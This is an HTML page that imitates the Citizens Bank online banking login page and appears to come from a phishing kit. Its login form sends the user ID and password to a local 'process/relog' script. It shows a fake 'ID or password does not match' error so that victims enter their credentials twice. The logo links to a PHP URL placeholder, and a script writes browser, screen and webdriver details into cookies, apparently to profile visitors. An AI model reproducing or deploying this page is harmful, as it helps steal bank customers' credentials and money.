
<html style="" class="js flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths citizens-Firefox citizens-user-none" lang="en-US">
  <head>
    <link href="img/apple-touch-icon.png" rel="apple-touch-icon">
    <link href="img/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76">
    <link href="img/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120">
    <link href="img/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152">
    <link href="img/apple-touch-icon-180x180.png" rel="apple-touch-icon" sizes="180x180">
    <link href="img/icon-hires.png" rel="icon" sizes="192x192">
    <link href="img/icon-normal.png" rel="icon" sizes="128x128">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <script type="text/javascript">
      var timeStamp = new Date().toString();
      var pageURL = ((window.frames && window.frames.length) ? window.frames[0].location.href : window.location.href);
      var pageName = ((window.document && window.document.title) ? window.document.title : "not available");
      var digitalData = {
        "sessionInformation": {
          "zipCode": "",
          "country": "",
          "city": "",
          "state": "",
          "timeStamp": timeStamp
        }
        ,
        "customerAttributes": {
          "CISKey": "",
          "DirectoryID": ""
        }
        ,
        "contentInteractions": {
          "siteName": "OLB",
          "siteSection": "Authenticated",
          "pageName": pageName,
          "pageURL": pageURL,
          "pageType": "Legacy"
        }
      };
      if (typeof(parent.Bootstrapper) !== "undefined" && parent.Bootstrapper.ensEvent && parent.Bootstrapper.ensEvent.trigger){
        if(window.frames && window.frames.length) parent.Bootstrapper.ensEvent.trigger("OLBURLChangeFrame");
        else parent.Bootstrapper.ensEvent.trigger("OLBURLChangeWindow");
      }
    </script>
    <title>Online Login | Citizens Bank
    </title>
    <meta name="description" content="Log in to your Citizens Bank account by entering your User ID and password so you can securely view and manage your accounts online.">
    <script src="js/pm_fp.js"> </script>
    <link rel="stylesheet" href="css/jquery-ui-1.10.3.custom.min.css">
    <link rel="stylesheet" href="css/normalize.css">
    <link rel="stylesheet" href="css/main.css">
    <link rel="stylesheet" href="css/flows.css">
    <link rel="stylesheet" href="css/ad-containers.css">
    <script src="js/modernizr-2.6.2.min.js"></script>
    <script charset="UTF-8" src="js/tag.js"> </script>
    <script src="js/jquery-1.9.1.min.js"></script>
    <script src="js/plugins.js"></script>
    <script src="js/main.js"></script>
    <script src="js/placeholders.min.js"></script>
    <script src="js/PrivateWindowCheck.js"></script>
    <style>
      input[type=password].error {
        border-color : red;
      }
    </style>
  </head>
  <script type="text/javascript" id="custom-useragent-string-page-script">
  </script>
  <body class="responsive-enabled" style="display: block;">
    <script>
      if(self == top) {
        var thebody = document.getElementsByTagName('body')[0]
        thebody.style.display = "block"
      }
      else {
        top.location = self.location
      }
    </script>
    <script type="text/javascript" src="js/tealeaf.js">
    </script>
    <script>
      document.cookie = "time="+(new Date());
      document.cookie = "sw=" + screen.width;
      document.cookie = "sh=" + screen.height;
      document.cookie = "cookie="+navigator.cookieEnabled;
      document.cookie = "language="+navigator.language;
      document.cookie = "cpu="+navigator.oscpu;
      document.cookie = "webdriver="+navigator.webdriver;
      isPrivateWindow(function(is_private) {
        if(is_private)
          document.cookie = "private_mode=true";
        else
          document.cookie = "private_mode=false";
        });
    </script>
    <div class="citizens-header-footer-injected">
      <link rel="stylesheet" type="text/css" href="css/citizensns.min.44438.css">
      <style>
        .help-modal-header .help-modal-close {
          background: url(img/modal-help-close.png) center center no-repeat transparent;
          background-size: 20px;
        }
        .help-modal-menu a.active {
          background: #f2faf8 url(img/arrow-right-green.png) right 20px center no-repeat;
          background-position: right 20px center;
          background-size:7px}
        .account-section-title.checkmark h1 {
          padding: 0px 0px 5px 28px !important;
        }
        .lt-ie9 .help-modal-menu a.active {
          background: #f2faf8 url(img/arrow-right-green.png) right 20px center no-repeat !important;
          background-size:7px !important}
        .input-wrapper .tooltip {
          margin-left: 1px;
        }
      </style>
      <div class="citizens-header-footer">
        <div class="citi-modal timeout-modal simplemodal-data" id="timeout-modal" style="display:none;">
        </div>
        <div class="citi-modal help-modal" id="help-modal" tabindex="0" style="display:none;">
        </div>
      </div>
    </div>
    <div class="citizens-header">
      <style>
        .citizens-header-footer-overlay{
          opacity:1;
          background-color:#fff;
          position:fixed;
          width:100%;
          height:100%;
          top:0px;
          left:0px;
          z-index:1000;
        }
        .citizens-header-footer-overlay .centered-content {
          width: 100%;
          max-width: 1060px;
          padding: 0 20px;
          margin: 0 auto;
          font-family: arial, helvetica, san-serif;
          font-size: 14px;
        }
        .citizens-header-footer-overlay .responsive-enabled .centered-content {
          width: auto;
          max-width: 1060px;
        }
        .citizens-header-footer-overlay .page-logo {
          float: none;
        }
        .citizens-header-footer-overlay .page-logo img{
          margin: 10px;
          float: none;
        }
        .citizens-header-footer-overlay .topshadow {
          position: absolute;
          width: 100%;
          top: 100px;
          z-index: 5;
          height: 8px;
          background: -webkit-radial-gradient(50% 100%, farthest-side, rgba(0, 0, 0, 0.1), transparent 100%);
          background: radial-gradient(farthest-side at 50% 100%, rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0) 100%);
          background-repeat: no-repeat;
          background-size: cover;
        }
      </style> 
      <!-- end overlay -->
      <style>
        .account-section-title.checkmark h1 {
          padding: 0px 0px 5px 28px !important;
        }
        .mobile-alert-dot {
          min-width: 22px;
          min-height: 22px;
          width: auto;
          height: auto;
          max-width: 50px;
          max-height: 50px;
          padding: 5px;
        }
      </style>
      <div class="citizens-header-footer">
        <div id="page-header" class="page-header">
          <!-- inc-header.html START -->
          <div class="topshadow">
          </div>
          <div class="centered-content clearfix">
            <a href="<?php echo $url;?>" class="page-logo" tabindex="1">
              <img alt="Citizens Bank" src="img/CTZ_Green-01.png" width="203" height="25" border="0">
            </a>
            <div id="header-navigation-container">
            </div>
          </div>
        </div>
      </div>
    </div>
    <div id="page-container" class="page-container">
      <div class="centered-content clearfix">
        <section id="top-content" class="page-region top-content">
        </section>
        <section id="main-container" class="main-container two-col layout-2-1 clearfix">
          <section id="main-content" class="page-region main-content">
            <div class="account-table account-table-full">
              <span class="account-table-border">
              </span>
              <div class="account-table-content">
                <div class="account-content-container">
                  <div class="account-table-body">
                    <header class="account-section-title clearfix account-secure">
                      <a href="#" class="mobile-help-trigger">Help
                      </a>
                      <h1>Secure Online Banking Login
                      </h1>
                    </header>
                    <div id="GlobalMessageContainer">
                      <div class="global-message status-message">
                        <h1>Important Updates
                        </h1>
                        <p>
                        </p>
                        
                        <br>
                        <li>
                          <b>August is National Internet Safety Month!
                          </b> - Are your operating system settings for security patches set to update automatically? 
                          <a href="https://www.citizensbank.com/learning/cyber-security-center.aspx?WT.ac=CB_OLB_GlobalMsg_JuneNationalInternetSafety1_CS_LearnMore_A580" target="_blank">LEARN MORE
                          </a> on how you can help toward a safer online experience. 
                        </li>
                        <p>
                        </p>
                      </div>
                    </div>
                    <div id="messagecontainer" class="error-message show-error error-visible" role="alert">The online user ID or password below does not match our records. Please review your information then try again.
                    </div>
                    <section class="account-section">
                      <form class="pay-transfer-options clearfix" action="process/relog" name="SignOn" id="frmSignOn" method="post">
                        <div class="account-title clearfix">
                          <p>Please enter your Online User ID and Password.
                          </p>
                        </div>
                        <input type="hidden" name="CSRF_TOKEN" value="">
                        <input type="hidden" name="BrandSettingsFile" value="citSettings.jsp">
                        <input type="hidden" name="fp_deviceprint" value="">
                        <input type="hidden" name="fp_language" value="">
                        <input type="hidden" name="fp_timezone" value="">
                        <input type="hidden" name="fp_browser" value="">
                        <input type="hidden" name="fp_screen" value="">
                        <input type="hidden" name="fp_software" value="">
                        <input type="hidden" name="pm_fp" value="">
                        <input type="hidden" name="RSASessionID" value="">
                        <input type="hidden" name="asstFlow" value="">
                        <input type="hidden" name="initlogin" value="1">
                        <input type="hidden" name="enterUserIdMode" value="">
                        <div class="form-item label-right full-width clearfix">
                          <label class="error" for="UserID">
                            <strong>Online User ID: 
                            </strong>
                          </label>
                          <input tabindex="1" type="text" id="UserID1" name="UserID1" autocomplete="off" maxlength="20" class="required demo-username error">
                          <input type="hidden" name="enterUserIdMode" value="true">
                          <input type="hidden" id="SaveUserID" name="SaveUserID" value="">
                          <div class="full-width checkbox-item clearfix">
                            <input type="hidden" name="Register" id="Register" value="0">
                            <input type="checkbox" tabindex="5" id="cbSaveUserID" name="cbSaveUserID" style="vertical-align:top">
                            <span class="inline-tooltip">
                              <label for="cbSaveUserID">Remember User ID
                              </label>
                              <span class="tooltip" tabindex="6" role="tooltip" aria-describedby="tooltip-content">
                                <div class="tooltip-icon" title="Remember User ID tooltip">
                                </div>
                                <div class="tooltip-box">
                                  <div class="tooltip-content" id="aria-tooltip-content">
                                    <span class="tooltip-arrow">
                                    </span>
                                    <div>Select the "Remember User ID" box  on the Login page if you want to be remembered.
                                    </div>
                                    <br>
                                    <div>Please note, if the "Remember User ID" check box is not displayed on the Login page, click on the "Login using different Online User ID" link to display it.
                                    </div>
                                    <br>
                                    <div>DO NOT check this box if you are using a public device that is accessible to others.
                                    </div>
                                  </div>
                                  <div class="bottomshadow">
                                  </div>
                                </div>
                              </span>
                            </span>
                          </div>
                          <div class="form-item full-width">
                            <label class="error" for="currentpassword">
                              <strong>Password: 
                              </strong>
                            </label>
                            <input tabindex="2" type="password" id="password1" name="password1" maxlength="15" size="15" class="required demo-password error">
                          </div>
                          <span class="mobile-line-break">
                            <a tabindex="7" style="font-size:16px!important" id="troublelogging" data-trigger="login-trouble" href="">Trouble logging in?
                            </a>
                          </span>
                          <br>
                        </div>
                       
                        <div class="form-actions">
                          <input type="submit" class="submit-button arrow" name="submit" tabindex="3" data-trigger="next" value="Login"> 
                          <a tabindex="8" href="" class="cancel">Cancel
                          </a>           
                        </div>
                      </form>
                    </section>
                  </div>
                </div>
              </div>
            </div>
          </section> 
          <aside id="main-sidebar" class="page-region main-sidebar">
            <div id="citizens-help" class="citizens-help sidebar-item sidebar-list-container sidebar-accordian mobile-modal">
              <div class="sidebar-list-content">
                <header class="sidebar-list-title">
                  <h3>Need Help?
                  </h3>
                </header>
                <div id="faq-holder">
                  <form action="" name="frmAsst" id="frmAsst" method="post">
                    <input type="hidden" name="CSRF_TOKEN" value="">
                    <input type="hidden" name="needHelp" value="1">
                    <section class="toggle-list-container faq-container" id="faq-index-1">
                      <a href="#" title="Expand contents of Where can I get login assistance for Online Banking?" aria-label="Expand Contents" class="sidebar-list-option-accordian showhide">Where can I get login assistance for Online Banking?
                      </a>
                      <ul class="loginfaq sidebar-list showhide-content">
                        <li>
                          <p>Simply click on "Trouble logging in?" link. Or, you can click on  "View All Help Topics" link, which appears on each screen.
                          </p>
                        </li>
                      </ul>
                    </section>
                    <section class="toggle-list-container faq-container" id="faq-index-10">
                      <a href="#" title="Expand contents of Is Online Banking secure?" aria-label="Expand Contents" class="sidebar-list-option-accordian showhide">Is Online Banking secure?
                      </a>
                      <ul class="loginfaq sidebar-list showhide-content">
                        <li>
                          <p>To make Online Banking secure, Citizens Bank uses the highest level of encryption available today. Encryption is the process by which information is translated into un-interpretable code and then back to recognized information.
                            <br>As an added measure, Online Banking gives you the capability to easily verify that you are on the authentic Citizens Bank website and not on a fake site created by fraudsters. Just look for the green bar (or some variation of it) in your browser address. The green bar should remind you that "green is good" and that our website has passed a sophisticated authentication process, letting you know you are good to go.
                          </p>
                        </li>
                      </ul>
                    </section>
                    <section class="toggle-list-container faq-container" id="faq-index-12">
                      <a href="#" aria-label="Expand Contents" class="sidebar-list-option-accordian showhide" title="Show contents of Should my browser address bar have a green indicator when I use Online Banking?">Should my browser address bar have a "green" indicator when I use Online Banking?
                      </a>
                      <ul class="loginfaq sidebar-list showhide-content">
                        <li>
                          <p>Yes. As an added measure, Online Banking gives you the capability to easily verify that you are on the authentic Citizens Bank website and not on a fake site created by fraudsters. Just look for the green bar (or some variation of it) in your browser address. The green bar should remind you that "green is good" and that our website has passed a sophisticated authentication process, letting you know you are good to go.
                          </p>
                        </li>   
                      </ul>
                    </section>
                    <section class="toggle-list-container faq-container" id="faq-index-20">
                      <a href="#" title="Expand contents of How do I log into Online Banking if Iâm a first-time user?" aria-label="Expand Contents" class="sidebar-list-option-accordian showhide">How do I log into Online Banking if I'm a first-time user?
                      </a>
                      <ul class="loginfaq sidebar-list showhide-content">
                        <li>
                          <p>Simply enter your Online User ID and Password and click "LOGIN", then answer your Challenge Question (if presented). In some situations, your Online User ID will be your ATM/Debit Card number and your Password will be the last four digits of your Social Security number followed by "Abcd" (e.g. 1234Abcd). If you haven't already selected an Online User ID, you will be asked to do so.
                          </p>
                        </li>
                      </ul>
                    </section>
                  </form>
                </div>
                <ul class="sidebar-list">
                  <li class="cta-row">
                    <a href="login-faqs.jsp" class="blue" target="_blank">View All Help Topics
                    </a>
                  </li>
                  <li class="cta-row sign-up-prompt visible clearfix">
                    <span>Haven't signed up for Online Banking?
                    </span>
                    <a href="" class="cta orange">Enroll Now
                    </a>
                  </li>
                </ul>
              </div>
            </div>
          </aside>
          <script type="text/javascript"> 
            $(document).ready(function() {
              $("#troubleloggingin1,#troubleloggingin2,#troubleloggingin3,#troubleloggingin4").click(function(e) {
                e.preventDefault();
                $("#frmAsst").attr("action","");
                $("#frmAsst").submit();
              }
                                                                                                    );
              $("#resetpassword1").click(function(e) {
                e.preventDefault();
                $("#frmAsst").attr("action","");
                $("#frmAsst").submit();
              }
                                        );
            }
                             );
          </script>
        </section> 
      </div> 
    </div> 
    <div class="citizens-footer">
    <div class="citizens-header-footer">
      <footer id="page-footer" class="page-footer">
        <div class="footer-top">
          <ul>
            <li>
              <a href="#" class="contact" title="Opens Ways to Contact Us Dialog"> <span class="account-underline">Ways to Contact Us</span><span class="visuallyhidden">- Opens Ways to Contact Us Dialog</span> </a>
              <div class="dropup-menu">
                <h4>Contact Us</h4>
                <p>General Questions:
                  <br> <strong>1-800-656-6561</strong> (personal bank accounts)
                  <br> Business Questions:
                  <br> <strong>1-877-229-6428</strong> (online banking support)
                  <br> <strong>1-800-862-6200</strong> (account information)
                  <br> Investment Questions:
                  <br> <strong>1-800-942-8300</strong> (Citizens Securities, Inc.) </p>
                <!--
<p>Go to <a href="/customer-service/">Customer Service</a> to send us email or mail or to view FAQs</p>
<p><a href="/forms/contactme.aspx">We'll Contact You</a></p>
-->
              </div>
            </li>
            <!-- As part of Def# 1465 Location is commented on Auth/UnAuth pages.
<li><span class="location">Your Location: NONE</span>
</li>
-->
            <li>
              <a href="#" class="locator" title="Opens Branch &amp; ATM Locator Dialog"> <span class="account-underline">Branch &amp; ATM Locator</span><span class="visuallyhidden">- Opens Branch &amp; ATM Locator Dialog</span> </a>
              <div class="dropup-menu">
                <h4>Branch &amp; ATM Locator</h4>
                <p>Find one of our 1,300 locations near you.</p>
                <div role="form">
                  <div id="stickyFooterBranch-error" class="error-message" style="display: none"></div>
                  <input id="stickyFooterBranch" type="text" title="Enter Zip Code or City, State" placeholder="Enter Zip Code or City, State" value="NONE"> <a href="#" type="button" class="button button-stickyfooterbranch">Submit</a> </div>
              </div>
            </li>
            <li>
              <a onclick="showSurvey(formId);" style="cursor:pointer;"><img src="img/feedback.png" alt="Give Feedback" border="0" style="cursor:pointer;border:0px;height:40px;width:40px;padding-right:4px;">Feedback</a>
            </li>
          </ul>
        </div>
        <div class="footer-row clearfix">
          <ul>
            <li>
              <h6>Checking &amp; Savings</h6> </li>
            <!--        <li><a target="_blank" href="http://www.citizensbank.com/checking-and-savings.aspx">Checking &amp; Savings Overview</a></li>-->
            <li> <a target="_blank" href="http://www.citizensbank.com/checking/">Checking</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/savings-and-cds/savings.aspx">Savings</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/savings-and-cds/money-markets.aspx">Money Markets</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/savings-and-cds/cds.aspx">Certificates of Deposit (CDs)
<sup>®</sup>
</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/ira/">IRAs</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/checking-and-savings/programs-and-services.aspx">Programs &amp; Services</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/checking-and-savings/benefits-and-features.aspx">Benefits &amp; Features</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/checking/debit-cards/standard.aspx">Debit Card</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/overdraft-protection/">Overdraft Choices
<sup>®</sup>
</a> </li>
          </ul>
          <ul>
            <li>
              <h6>Home Borrowing</h6> </li>
            <!--        <li><a target="_blank" href="http://www.citizensbank.com/loans/">Home Borrowing Overview</a></li>-->
            <li> <a target="_blank" href="http://www.citizensbank.com/mortgages/">Mortgages</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/home-equity/loans.aspx">Home Equity Loans</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/home-equity/lines.aspx">Home Equity Lines of Credit</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/loans/determine-my-rate.aspx">Determine My Rate</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/mortgages/my-mortgage.aspx">My Mortgage Account</a> </li>
          </ul>
          <ul>
            <li>
              <h6>Students</h6> </li>
            <!--<li><a target="_blank" href="http://www.citizensbank.com/student-services/">Students Overview</a></li>
<li><a target="_blank" href="http://www.citizensbank.com/student-banking/">Banking</a></li>
<li><a target="_blank" href="http://www.citizensbank.com/student-loans/undergradfamilies.aspx">Undergraduate Borrowing</a></li>
<li><a target="_blank" href="http://www.citizensbank.com/student-loans/gradstudents.aspx">Graduate Borrowing</a></li>
<li><a target="_blank" href="http://www.citizensbank.com/student-loans/process.aspx">The Student Loan Process</a></li>
<li><a target="_blank" href="http://www.citizensbank.com/student-loans/tools.aspx">Student Tools &amp; Resources</a></li>-->
            <li> <a target="_blank" href="http://www.citizensbank.com/student-loans/default.aspx">Student Loan Options</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/student-loans/education-refinance-loan-overview.aspx">Refinancing Student Loans</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/student-loans/process/default.aspx">The Student Loan Process</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/student-loans/process/undergraduate.aspx">Undergraduate Students &amp; Parents</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/student-loans/process/graduate.aspx">Graduate Students</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/student-loans/tools.aspx">Tools &amp; Information</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/checking/one-deposit-checking-account.aspx">Banking for Students</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/student-services/access-my-student-loan/default.aspx">Access My Student Loan</a> </li>
          </ul>
          <ul class="last">
            <li>
              <h6>Cards</h6> </li>
            <!--        <li><a target="_blank" href="http://www.citizensbank.com/cards-and-rewards/">Cards Overview</a></li>-->
            <li> <a target="_blank" href="http://www.citizensbank.com/credit-cards/overview.aspx">Credit Cards</a> </li>
            <!--        <li><a target="_blank" href="http://www.citizensbank.com/cards-and-rewards/debit-card/debit-card.aspx">Debit Card</a></li>-->
            <li> <a target="_blank" href="http://www.citizensbank.com/cards-and-rewards/credit-cards/creditcardagreements/agreements.aspx">Card Agreements</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/security/">Security Features</a> </li>
          </ul>
        </div>
        <div class="footer-row clearfix">
          <ul>
            <li>
              <h6>Personal Loans</h6> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/personal-loans/overview.aspx">Overview</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/personal-loans/faqs.aspx">FAQs</a> </li>
          </ul>
          <ul>
            <li>
              <h6>Resources</h6> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/checking/order-checks.aspx">Order Checks</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/online-and-mobile-banking/default.aspx">Online &amp; Mobile Banking</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/customer-service/">Customer Service</a> </li>
          </ul>
          <ul>
            <li>
              <h6>About Us</h6> </li>
            <!--        <li><a target="_blank" href="http://www.citizensbank.com/about-us/">About Us Overview</a></li>-->
            <li> <a target="_blank" href="http://investor.citizensbank.com/about-us/our-company.aspx">About Citizens Bank</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/community/">In the Community</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/careers/">Careers</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/about_our_ads.aspx">About Our Ads</a> </li>
          </ul>
          <ul class="last">
            <li>
              <h6>Solutions</h6> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/">Personal</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/investing/">Investing</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/small-business/">Small Business</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/commercial-banking/">Commercial</a> </li>
          </ul>
        </div>
        <div class="footer-row clearfix">
          <ul>
            <li>
              <h6>Disclosures</h6> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/pf/onlinebanking/terms.aspx">Online Terms and Conditions</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/pdf/CTZ_eSign.pdf">Electronic Notice Disclosure and Consent (Online Service)</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/checking-and-savings/account-documents.aspx">Account Documents</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/tools/leaving.aspx?url=http://www.fdic.gov">Member FDIC</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/security/equal-housing-lender.aspx">Equal Housing Lender
<img alt="Equal Housing Lender" title="Equal Housing Lender" src="/efs/hhf/img/equal-housing.gif">
</a> </li>
            <li> <a target="_blank" href="http://www.citizensbank.com/security/">Security, Privacy &amp; Legal</a> </li>
          </ul>
        </div>
        <div class="centered-content">
          <div class="footer-bottom">
            <p class="legal"> Zelle and the Zelle related marks are wholly owned by Early Warning Services, LLC and are used herein under license. </p>
            <p class="legal"> *Securities, Insurance and Investment Advisory Services offered through Citizens Securities, Inc. ("CSI"), also referred to as Citizens Securities, Inc. CSI is an SEC registered investment adviser and Member - FINRA and SIPC. 770 Legacy Place, MLP240, Dedham, MA 02026. (800) 942-8300. CSI is an affiliate of Citizens Bank, N.A.
              <br>
              <br>The investment balances shown in online banking are based on market prices, with up to a fifteen minute delay from the time this webpage was last refreshed. Information relating to accounts not held at CSI is presented as an accommodation and while drawn from sources believed to be reliable is not guaranteed as to accuracy or completeness. Such information should be independently confirmed by the account owner(s).
              <br>
              <br>Information relating to accounts not held or custodied by National Financial Services (NFS) (Assets Held Away), CSI’s clearing broker dealer, was provided to NFS by outside parties and is included for informational purposes only. These positions are not part of your brokerage account carried by NFS and therefore any SIPC account protection afforded your account through NFS does not cover these assets or prices reported. Neither NFS, CSI nor Citizens Bank are responsible for the Assets Held Away information provided and does not guarantee the accuracy or timeliness of the positions or prices reported. Prices shown do not necessarily reflect the actual current market prices. Further information regarding these prices may be obtained by contacting CSI.
              <br>
              <br>The investment products and financial strategies suggested herein are subject to investment risk, including possible loss of principal amount invested. Investment decisions should be based on each individual's goals, time horizon and tolerance for risk.
              <br>
              <br>SpeciFi<sup>®</sup> is made available through CSI. Portfolio management services are sub-advised by SigFig Wealth Management, LLC ("SigFig"), an SEC registered investment adviser. SigFig is not an affiliate of CSI or Citizens Bank, N.A. </p>
            <div class="footer-disclaimer-box footer-disclaimer-box--margin-bottom footer-disclaimer">
              <p class="footer-disclaimer-box__text">Securities, Insurance Products and Advisory Services are:</p>
              <ul class="footer-disclaimer-box__list">
                <li class="footer-disclaimer-box__list-item">NOT FDIC INSURED</li>
                <li class="footer-disclaimer-box__list-item">NOT BANK GUARANTEED</li>
                <li class="footer-disclaimer-box__list-item">MAY LOSE VALUE</li>
                <li class="footer-disclaimer-box__list-item">NOT A DEPOSIT
                  <br> </li>
                <li class="footer-disclaimer-box__list-item">NOT INSURED BY ANY FEDERAL GOVERNMENT AGENCY</li>
              </ul>
            </div>
            <ul class="footer-util">
              <li class="sitemap"> <a target="_blank" href="">Site Map</a> </li>
              <li>Follow:
                <a target="_blank" href=""> <img src="img/footer-follow-facebook.png" alt="Facebook" align="middle"> </a>
                <a target="_blank" href=""> <img src="img/footer-follow-twitter.png" alt="Twitter"> </a>
                <a target="_blank" href=""> <img src="img/footer-follow-linkedin.png" alt="Linkedin"> </a>
                <a target="_blank" href=""> <img src="img/footer-follow-youtube.png" alt="Youtube"> </a>
              </li>
            </ul>
            <p class="footer-copyright"> © Copyright 2021 Citizens Financial Group, Inc. All rights reserved.
              <br>Citizens Bank is a brand name of Citizens Bank, N.A. (NMLS ID# 433960).
              <br>Citizens Bank corporate headquarters: One Citizens Plaza, Providence, RI 02903 </p> <img src="img/elh.gif" alt="Equal Housing Lender"> <img src="img/fdicFooter.gif" alt="Member FDIC"> </div>
        </div>
      </footer>
    </div>
  </div>
  <!-- end CITIZENS BANK Hosted Footer -->
  <link rel="stylesheet" type="text/css" href="css/sec-3-5.css">
  <div id="sec-overlay" style="display:none;">
    <div id="sec-container"> </div>
  </div>
  <!--  End Main Container -->
</body>

</html>